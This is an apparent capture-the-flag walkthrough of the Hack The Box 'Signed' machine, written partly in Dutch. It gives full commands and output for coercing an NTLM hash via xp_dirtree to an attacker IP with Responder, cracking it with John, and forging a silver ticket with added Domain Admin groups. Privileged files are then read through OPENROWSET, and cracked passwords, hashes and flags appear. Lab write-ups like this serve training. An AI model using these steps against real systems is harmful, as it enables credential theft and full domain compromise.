### Machine Information

As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH

# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```  
┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~]  
└──╼ [★]$ nmap 10.129.32.54  
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org "https://nmap.org/") ) at 2025-10-13 03:25 CDT  
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 25.50% done; ETC: 03:27 (0:01:51 remaining)  
Nmap scan report for 10.129.32.54  
Host is up (0.15s latency).  
Not shown: 999 filtered tcp ports (no-response)  
PORT     STATE SERVICE  
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 83.40 seconds  
```  
### Detailed port scan

At the detailed port scan go to get more information from the services which are open on the ip address.

```  
┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~]  
└──╼ [★]$ nmap -p1433 -sCV 10.129.32.54  
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org "https://nmap.org/") ) at 2025-10-13 03:29 CDT  
Nmap scan report for 10.129.32.54  
Host is up (0.15s latency).

PORT     STATE SERVICE  VERSION  
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RC0+  
| ms-sql-info:   
|   10.129.32.54:1433:   
|     Version:   
|       name: Microsoft SQL Server 2022 RC0+  
|       number: 16.00.1000.00  
|       Product: Microsoft SQL Server 2022  
|       Service pack level: RC0  
|       Post-SP patches applied: true  
|_    TCP port: 1433  
|_ssl-date: 2025-10-13T08:29:48+00:00; 0s from scanner time.  
| ms-sql-ntlm-info:   
|   10.129.32.54:1433:   
|     Target_Name: SIGNED  
|     NetBIOS_Domain_Name: SIGNED  
|     NetBIOS_Computer_Name: DC01  
|     DNS_Domain_Name: SIGNED.HTB  
|     DNS_Computer_Name: DC01.SIGNED.HTB  
|     DNS_Tree_Name: SIGNED.HTB  
|_    Product_Version: 10.0.17763  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2025-10-13T08:25:55  
|_Not valid after:  2055-10-13T08:25:55  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Zoals je kan zien is alleen de poort van de mssql server open. Aangezien dat er in de machine information al een username en een password stond. Zal ik deze gaan gebruiken voor in te loggen door gebruik te maken van de mssqlclient.

```  
┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~]  
└──╼ [★]$ mssqlclient.py signed.htb/scott:'Sm230#C5NatH'@10.129.32.54  
```

Ik ben een keer gaan kijken of dat er geen andere servers gelinked waren maar dit was niet het geval. Ik ben daarna eens gaan kijken of dat ik de xp_cmdshell kon gebruiken voor een connectie te maken tussen de server en de windows machine maar dit was ook niet het geval. Ik ben dus de xp_dirtree gaan gebruiken voor het verkrijgen van de hashes.

```  
SQL (scott  guest@msdb)> xp_dirtree \\10.10.14.75\shared --> Eigen IP gebruiken  
subdirectory   depth   file     
------------   -----   ----

Kali machine

sudo responder -I eth0 --> de interface moet in hetzelfde netwerk zitten als de IP dat je wilt hacken.

[SMB] NTLMv2-SSP Client   : 10.129.32.54  
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc  
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:55518c35a93b48bf:16F2F750845E578802CF45E60890A681:010100000000000080BFF75BFD3BDC011AF0FF28FCD54E6600000000020008004200480032004F0001001E00570049004E002D0033004D0043005300360055004E00480030003100530004003400570049004E002D0033004D0043005300360055004E0048003000310053002E004200480032004F002E004C004F00430041004C00030014004200480032004F002E004C004F00430041004C00050014004200480032004F002E004C004F00430041004C000700080080BFF75BFD3BDC0106000400020000000800300030000000000000000000000000300000EBE9A511D695E0328727F467301D99D9B46294291DBD0257CE2A04CB30F4C6790A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370035000000000000000000  
```

Ik ga de hash nu gaan cracken door gebruik te maken van John of hashcat. En zoals je hieronder zult kunnen zien hebben we de hash gecracked.

```  
┌─[eu-dedivip-1]─[10.10.14.75]─[hackthekat123@htb-jwbvhxkfjj]─[~]  
└──╼ [★]$ john --wordlist=/usr/share/wordlists/rocky  
ou.txt Hash_mssqlsvc   
Using default input encoding: UTF-8  
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
purPLE9795!@     (mssqlsvc)       
1g 0:00:00:01 DONE (2025-10-13 05:33) 0.5555g/s 2492Kp/s 2492Kc/s 2492KC/s purcitititya..puppuh  
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed.  
```

Ik zal nu een keer gaan inloggen op de mssqlclient met deze user credentials voor het zien welke rechten we hiermee hebben. En voor het zien of ik hiermee geen remote connectie kan maken met de windows machine.

```
mssqlclient.py signed.htb/mssqlsvc:'purPLE9795!@'@10.129.1.135
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC01): Line 1: Login failed for user 'mssqlsvc'.
```

We gaan als eerst proberen de sid te verkrijgen. Dit kan je gaan doen door gebruik te maken van het volgende netexec commando.

```
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ nxc mssql dc01.signed.htb \
        -u 'mssqlsvc' -p 'purPLE9795!@' \
        -q "select SUSER_SID('SIGNED\Domain Admins')"
MSSQL       10.129.1.135    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.1.135    1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 
MSSQL       10.129.1.135    1433   DC01             b'0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000'
```

Nu gaan we de hexdecimale getallen gaan omzetten naar de sid name. Dit kan je gaan doen door gebruik te maken van de volgende tool.

```
hex2sid '0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000'
S-1-5-21-4088429403-1159899800-2753317549-512
```

Aangezien dat als ik het password gebruik in plaintext het niet werkt, zal ik deze gaan veranderen naar de NTLM hash. Dit kan je gaan doen door de pypykatz tool te gebruiken.

```
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ pypykatz crypto nt 'purPLE9795!@'
ef699384c3285c54128a3ee1ddb1a0cc
```

Nu dat we de NTLM hash hebben kunnen we het zilveren ticket gaan aanmaken. Dit kan je doen door de tool impacket-ticketer te gebruiken.

```
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -user-id 1103 -groups 512,519,1105 -spn MSSQLSvc/DC01.SIGNED.HTB:1433 mssqlsvc
```

Gaan exporteren van de cert

```
export KRB5CCNAME=mssqlsvc.ccache
```

Door gebruik te maken van het nxc commando kan je dus de user flag en de root flag gaan uitlezen zonder dat je echt zult gaan inloggen op de windows machine. Dit kan je gaan doen door de volgende 2 commando's te gaan gebruiken. Dit heb ik gevonden door gebruik te maken van de volgende url https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/

```
User Flag

nxc mssql dc01.signed.htb -u mssqlsvc -k --use-kcache   -q "SELECT * FROM OPENROWSET(BULK 'C:\Users\mssqlsvc\desktop\user.txt', SINGLE_CLOB) AS Contents;"
MSSQL       dc01.signed.htb 1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       dc01.signed.htb 1433   DC01             [+] SIGNED.HTB\mssqlsvc from ccache (Pwn3d!)
MSSQL       dc01.signed.htb 1433   DC01             BulkColumn:b'4ee30a66ba99eac8c3b7d3ce2a30c579\r\n'

Root Flag

nxc mssql dc01.signed.htb -u mssqlsvc -k --use-kcache \
  -q "SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;"
MSSQL       dc01.signed.htb 1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       dc01.signed.htb 1433   DC01             [+] SIGNED.HTB\mssqlsvc from ccache (Pwn3d!)
MSSQL       dc01.signed.htb 1433   DC01             BulkColumn:b'a052f66d4737e60c165a52d40d5d8c4c\r\n'
```

ROOTED

![[Pasted image 20251015195807.png]]